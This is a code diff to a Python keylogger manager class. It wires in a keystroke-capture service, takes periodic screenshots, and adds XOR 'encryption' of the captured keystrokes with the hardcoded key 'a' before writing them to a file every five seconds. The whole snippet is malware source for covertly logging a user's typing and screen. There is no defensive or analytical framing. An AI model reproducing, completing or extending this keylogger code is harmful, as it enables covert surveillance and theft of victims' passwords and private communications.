@@ -2,19 +2,23 @@ from  KeyloggerService import *
 from FileWriter import *
 import threading
 import time
+from  IEncryptor import *
+
+from modules.Encryptor import XOREncryptor
 
 
 class KeyLoggerManager:
 
     def __init__(self):
         self.instance = KeyloggerService()
-        self.encryptor :  IEncryptor = XorEnc
+        self.encryptor :  IEncryptor = XOREncryptor()
+        self.writer : IWriter = FileWriter()
 
     def start(self):
         self.instance.start()
 
     def write_to_file(self):
-        FileWriter().write(self.instance.get_data())
+        self.writer.write(self.instance.get_data())
 
     def main(self):
         threading.Thread(target=self.start).start()
@@ -22,7 +26,9 @@ class KeyLoggerManager:
         while True:
             print(self.instance.current_app == self.instance.prev_up)
             self.instance.current_screenshot()
-            threading.Thread(target=self.write_to_file).start()
+            x = self.instance.get_data()
+            x = self.encryptor.encryption(x, "a")
+            self.writer.write(x)
             time.sleep(5)
 
 A = KeyLoggerManager()
